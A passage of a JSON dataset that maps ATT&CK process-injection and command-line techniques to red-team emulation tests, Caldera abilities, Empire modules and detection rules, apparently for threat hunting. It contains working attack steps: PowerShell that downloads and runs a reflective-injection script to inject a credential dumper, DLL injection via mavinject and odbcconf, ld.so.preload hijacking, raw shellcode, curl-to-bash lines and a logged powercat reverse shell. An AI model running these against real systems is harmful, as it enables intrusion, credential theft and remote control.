0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING #{dll_payload}\n"}}, {"name": "Shared Library Injection via /etc/ld.so.preload", "description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. \n", "supported_platforms": ["linux"], "input_arguments": {"path_to_shared_library": {"description": "Path to a shared library object", "type": "Path", "default": "PathToAtomicsFolder/T1055/bin/T1055.so"}, "path_to_shared_library_source": {"description": "Path to a shared library source code", "type": "Path", "default": "PathToAtomicsFolder/T1055/src/Linux/T1055.c"}, "tmp_folder": {"description": "Path of the temp folder", "type": "Path", "default": "/tmp/1055"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n", "prereq_command": "if [ -f #{path_to_shared_library ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}        \n"}], "executor": {"name": "bash", "elevation_required": true, "command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "cleanup_command": null}}, {"name": "Shared Library Injection via LD_PRELOAD", "description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n", "supported_platforms": ["linux"], "input_arguments": {"path_to_shared_library": {"description": "Path to a shared library object", "type": "Path", "default": "PathToAtomicsFolder/T1055/bin/T1055.so"}, "path_to_shared_library_source": {"description": "Path to a shared library source code", "type": "Path", "default": "PathToAtomicsFolder/T1055/src/Linux/T1055.c"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_to_shared_library})\n", "prereq_command": "if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}\n"}], "executor": {"name": "bash", "elevation_required": false, "command": "LD_PRELOAD=#{path_to_shared_library} ls\n"}}, {"name": "Process Injection via C#", "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"exe_binary": {"description": "Output Binary", "type": "Path", "default": "T1055.exe"}}, "executor": {"name": "command_prompt", "command": ".\\bin\\#{exe_binary}\n"}}, {"name": "svchost writing a file to a UNC path", "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", "cleanup_command": "del C:\\T1055.txt >nul 2>&1\ndel C:\\svchost.exe >nul 2>&1\n"}}]}}, {"Mitre Stockpile - Injects cred dumper exe into an available process": {"id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7", "name": "Inject Cred dumper into process (Spookier)", "description": "Injects cred dumper exe into an available process", "tactic": "credential-access", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}}}, {"Mitre Stockpile - Injects sandcat DLL into an available process": {"id": "a398986f-31b0-436a-87e9-c8e82c028f3c", "name": "Inject Sandcat into process", "description": "Injects sandcat DLL into an available process", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.process.id"}]}]}}, {"Mitre Stockpile - Leverage odbcconf for DLL injection": {"id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c", "name": "Signed Binary Execution - odbcconf", "description": "Leverage odbcconf for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}}}, {"Mitre Stockpile - Leverage Mavinject (signed binary) for DLL injection": {"id": "e5bcefee-262d-4568-a261-e8a20855ec81", "name": "Signed Binary Execution - Mavinject", "description": "Leverage Mavinject (signed binary) for DLL injection", "tactic": "defense-evasion", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}}}, {"Mitre Stockpile - Force shutdown a target system using Process Injection and raw shellcode": {"id": "0821b0b0-7902-4a7b-8052-80bda5a43684", "name": "Shutdown Target System", "description": "Force shutdown a target system using Process Injection and raw shellcode", "tactic": "privilege-escalation", "technique": {"attack_id": "T1055", "name": "Process Injection"}, "platforms": {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/code_execution/invoke_reflectivepeinjection", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_reflectivepeinjection\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/code_execution/invoke_shellcode", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_shellcode\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/code_execution/invoke_shellcodemsil", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_shellcodemsil\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/credentials/credential_injection", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/credentials/credential_injection\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/psinject", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/management/psinject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/reflective_inject", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/management/reflective_inject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/shinject", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"powershell/management/shinject\":  [\"T1055\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/management/osx/shellcodeinject64", "ATT&CK Technique #1": "T1055", "ATT&CK Technique #2": "", "Technique": "Process Injection", "Concatenate for Python Dictionary": "\"python/management/osx/shellcodeinject64\":  [\"T1055\"],"}}], "command_list": ["$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n", "$mypid = (get-process spoolsv).id\nmavinject $mypid /INJECTRUNNING #{dll_payload}\n", "sudo sh -c 'echo PathToAtomicsFolder/T1055/bin/T1055.so > /etc/ld.so.preload'\n", "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'\n", "LD_PRELOAD=PathToAtomicsFolder/T1055/bin/T1055.so ls\n", "LD_PRELOAD=#{path_to_shared_library} ls\n", ".\\bin\\T1055.exe\n", "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n", {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose"}}}, {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n"}}}, {"windows": {"psh": {"command": "odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\sandcat.dll\"}\n"}}}, {"windows": {"psh": {"command": "$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n"}}}, {"linux": {"shellcode_amd64,shellcode_386": {"command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"}}}, "powershell/code_execution/invoke_reflectivepeinjection", "powershell/code_execution/invoke_reflectivepeinjection", "powershell/code_execution/invoke_shellcode", "powershell/code_execution/invoke_shellcode", "powershell/code_execution/invoke_shellcodemsil", "powershell/code_execution/invoke_shellcodemsil", "powershell/credentials/credential_injection", "powershell/credentials/credential_injection", "powershell/management/psinject", "powershell/management/psinject", "powershell/management/reflective_inject", "powershell/management/reflective_inject", "powershell/management/shinject", "powershell/management/shinject", "python/management/osx/shellcodeinject64", "python/management/osx/shellcodeinject64", "```", "echo #{path_to_shared_library} > /etc/ld.so.preload", "```", "```", "echo /home/$USER/random.so > /etc/ld.so.preload", "```"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and process_command_line contains \"*Invoke-DllInjection*\"or process_command_line contains \"C:\\\\windows\\\\sysnative\\\\\"", "name": "Process Injection Process"}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit preload_lib", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "-w /etc/ld.so.preload -p wa -k preload_lib", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" ld.so.preload | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"title": "CobaltStrike Process Injection", "id": "6309645e-122d-4c5b-bb2b-22e4f9c2fa42", "description": "Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons", "references": ["https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f", "https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/"], "tags": ["attack.defense_evasion", "attack.t1055"], "status": "experimental", "author": "Olaf Hartong, Florian Roth, Aleksey Potapov, oscd.community", "date": "2018/11/30", "modified": "2019/11/08", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 8, "TargetProcessAddress|endswith": ["0B80", "0C7C", "0C88"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Malicious Named Pipe", "id": "fe3ac066-98bb-432a-b1e7-a5229cb39d4a", "status": "experimental", "description": "Detects the creation of a named pipe used by known APT malware", "references": ["Various sources"], "date": "2017/11/06", "author": "Florian Roth", "logsource": {"product": "windows", "service": "sysmon", "definition": "Note that you have to configure logging for PipeEvents in Symson config"}, "detection": {"selection": {"EventID": [17, 18], "PipeName": ["\\isapi_http", "\\isapi_dg", "\\isapi_dg2", "\\sdlrpc", "\\ahexec", "\\winsession", "\\lsassw", "\\46a676ab7f179e511e30dd2dc41bd388", "\\9f81f59bc58452127884ce513865ed20", "\\e710f28d59aa529d6792ca6ff0ca1b34", "\\rpchlp_3", "\\NamePipe_MoreWindows", "\\pcheap_reuse", "\\msagent_*"]}, "condition": "selection"}, "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055"], "falsepositives": ["Unkown"], "level": "critical"}}, {"data_source": {"title": "Malware Shellcode in Verclsid Target Process", "id": "b7967e22-3d7e-409b-9ed5-cdae3f9243a1", "status": "experimental", "description": "Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro", "references": ["https://twitter.com/JohnLaTwC/status/837743453039534080"], "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055"], "author": "John Lambert (tech), Florian Roth (rule)", "date": "2017/03/04", "logsource": {"product": "windows", "service": "sysmon", "definition": "Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>"}, "detection": {"selection": {"EventID": 10, "TargetImage": "*\\verclsid.exe", "GrantedAccess": "0x1FFFFF"}, "combination1": {"CallTrace": "*|UNKNOWN(*VBE7.DLL*"}, "combination2": {"SourceImage": "*\\Microsoft Office\\\\*", "CallTrace": "*|UNKNOWN*"}, "condition": "selection and 1 of combination*"}, "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"title": "Exploit for CVE-2017-0261", "id": "864403a1-36c9-40a2-a982-4c9a45f7d833", "status": "experimental", "description": "Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262", "references": ["https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html"], "author": "Florian Roth", "date": "2018/02/22", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\WINWORD.EXE", "Image": "*\\FLTLDR.exe*"}, "condition": "selection"}, "falsepositives": ["Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)"], "level": "medium"}}, {"data_source": {"title": "Exploiting SetupComplete.cmd CVE-2019-1378", "id": "1c373b6d-76ce-4553-997d-8c1da9a6b5f5", "status": "experimental", "description": "Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd decribed in CVE-2019-1378", "references": ["https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua"], "author": "Florian Roth", "date": "2019/11/15", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentCommandLine": ["*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\SetupComplete.cmd", "*\\cmd.exe /c C:\\Windows\\Setup\\Scripts\\PartnerSetupComplete.cmd"]}, "filter": {"Image": ["C:\\Windows\\System32\\\\*", "C:\\Windows\\SysWOW64\\\\*", "C:\\Windows\\WinSxS\\\\*", "C:\\Windows\\Setup\\\\*"]}, "condition": "selection and not filter"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Dridex Process Pattern", "id": "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e", "status": "experimental", "description": "Detects typical Dridex process patterns", "references": ["https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3"], "author": "Florian Roth", "date": "2019/01/10", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": "*\\svchost.exe C:\\Users\\\\*\\Desktop\\\\*"}, "selection2": {"ParentImage": "*\\svchost.exe*", "CommandLine": ["*whoami.exe /all", "*net.exe view"]}, "condition": "1 of them"}, "falsepositives": ["Unlikely"], "level": "critical"}}]}, {"technique_id": "T1059", "commands": [{"source": "atomics/T1059/T1059.yaml", "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\n", "name": null}, {"source": "data/abilities/execution/134b49a3-3f93-41bd-85f4-563eadbb6055.yml", "command": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}, "name": "Kill all PowerShell processes"}, {"source": "data/abilities/execution/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml", "command": {"darwin": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Off\n", "cleanup": ".\\wifi.ps1 -On\n", "payloads": ["wifi.ps1"]}}}, "name": "Turn a computers WIFI off"}, {"source": "data/abilities/execution/4cd4eb44-29a7-4259-91ae-e457b283a880.yml", "command": {"darwin": {"sh": {"cleanup": "rm #{payload}\n"}}, "linux": {"sh": {"cleanup": "rm #{payload}\n"}}, "windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \"#{payload}\""}}}, "name": "Remove a downloaded payload file"}, {"source": "data/abilities/execution/a42dfc86-12f0-4f06-b0cf-24830c7f61f4.yml", "command": {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3"}}}, "name": "Start a new calculator process"}, {"source": "data/abilities/execution/b1d41972-3ad9-4aa1-8f7f-05f049a2980e.yml", "command": {"darwin": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}, "linux": {"sh": {"command": "nohup ./sandcat.go -server #{server} &\n", "cleanup": "pkill -f sandcat\n", "payloads": ["sandcat.go"]}}}, "name": "Start a new 54ndc47 agent in background"}, {"source": "SysmonHunter - Command-Line Interface", "command": "\\\\Windows\\\\.+\\\\cmd.exe", "name": null}, {"source": "SysmonHunter - Command-Line Interface", "command": "cmd.exe|/c", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sqloscmd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_sqloscmd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawnas", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawnas", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ certutil.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: CertUtil.exe\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertUtil.exe\nCommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0xbcc\nNew Process Name: C: \\ Windows \\ System32 \\ certutil.exe\n\n#windows server 2008 (excluding 2008) or more systems can be configured to create a policy review process, achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters.", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nEventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded\nProcess information:\nNew Process ID: 0x474\nNew Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n\nEventID: 4688\nProcess information:\nNew Process ID: 0x3f8\nNew Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\n\nEventID: 5156\nApplication Information:\nProcess ID: 1016\nApplication Name: \\ device \\ harddiskvolume2 \\ users \\ 12306br0 \\ desktop \\ a \\ payload.exe\n\nInternet Information:\nDirection: Outbound\nSource address: 192.168.126.149\nSource Port: 49221\nDestination address: 192.168.126.146\nDestination Port: 53\nProtocol: 6\n\nEventID: 1 #sysmon log\nImage: C: \\ Windows \\ System32 \\ cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Command Processor\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: C: \\ Windows \\ system32 \\ cmd.exe / C C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\nCurrentDirectory: C: \\ Windows \\ system32 \\\nUser: 12306Br0-PC \\ 12306Br0\nLogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}\nLogonId: 0x550ac\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8\nParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}\nParentProcessId: 1112\nParentImage: C: \\ Windows \\ System32 \\ ftp.exe\nParentCommandLine: ftp", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\n#sysmon log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ powershell.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows PowerShell\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell -c \"IEX (New-Object System.Net.WebClient) .DownloadString ( 'http://192.168.126.146/powercat.ps1'); powercat -c 192.168.126.146 -p 1234 -e cmd\"\n\n# Win7 security log\nEventID: 4688\nProcess information:\nNew Process ID: 0x330\nNew Process Name: C: \\ Windows \\ System32 \\ cmd.exe\nToken Type lift: TokenElevationTypeLimited (3)\n\nEventID: 4688\nProcess information:\nNew Process ID: 0xa44\nNew Process Name: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ powershell.exe\n\n#Powershell V5 (V5 containing more than) configuration audit policy, you can achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters. Of course, it can also be used to configure windows server 2008 (excluding 2008) over the audit process to create a policy, you can also record on the command line parameters, and finally to monitoring results.", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Command-Line Interface": {"attack_technique": "T1059", "display_name": "Command-Line Interface", "atomic_tests": [{"name": "Command-Line Interface", "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash\n", "cleanup_command": "rm /tmp/art-fish.txt\n"}}]}}, {"Mitre Stockpile - Kill all PowerShell processes": {"id": "134b49a3-3f93-41bd-85f4-563eadbb6055", "name": "Stop PowerShell processes", "description": "Kill all PowerShell processes", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "platforms": {"windows": {"pwsh": {"command": "Get-Process -Name \"powershell\" | Stop-Process\n"}}}}}, {"Mitre Stockpile - Turn a computers WIFI off": {"id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "name": "Disrupt WIFI", "description": "Turn a computers WIFI off", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "platforms": {"darwin": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh off\n", "cleanup": "./wifi.sh on\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Off\n", "cleanup": ".\\wifi.ps1 -On\n", "payloads": ["wifi.ps1"]}}}}}, {"Mitre Stockpile - Remove a downloaded payload file": {"id": "4cd4eb44-29a7-4259-91ae-e457b283a880", "name": "Delete payload", "description": "Remove a downloaded payload file", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "platforms": {"darwin": {"sh": {"cleanup": "rm #{payload}\n"}}, "linux": {"sh": {"cleanup": "rm #{payload}\n"}}, "windows": {"psh,pwsh": {"cleanup": "Remove-Item -Force -Path \"#{payload}\""}}}}}, {"Mitre Stockpile - Start a new calculator process": {"id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4", "name": "Spawn calculator (shellcode)", "description": "Start a new calculator process", "tactic": "execution", "technique": {"attack_id": "T1059", "name": "Command-Line Interface"}, "platforms": {"windows": {"shellcode_amd64": {"command": "0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 